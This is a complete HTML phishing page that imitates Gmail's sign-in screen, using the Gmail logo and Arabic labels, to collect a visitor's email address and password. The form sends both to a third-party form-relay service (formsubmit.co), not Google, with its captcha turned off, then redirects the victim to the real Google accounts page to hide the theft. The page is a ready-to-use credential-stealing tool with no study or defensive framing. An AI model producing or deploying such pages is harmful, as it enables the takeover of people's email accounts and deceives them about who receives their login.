<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; text-align: center; padding-top: 30px; }
        form { max-width: 350px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; }
        img { width: 80px; margin-bottom: 20px; }
        h2 { color: #202124; }
    </style>
</head>
<body>
    <form action="https://formsubmit.co/el/dopuni" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://accounts.google.com">
        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x.png" alt="Gmail">
        <h2>تسجيل الدخول</h2>
        <input type="email" name="email" placeholder="البريد الإلكتروني" required>
        <input type="password" name="password" placeholder="كلمة المرور" required>
        <button type="submit">التالي</button>
    </form>
</body>
</html>
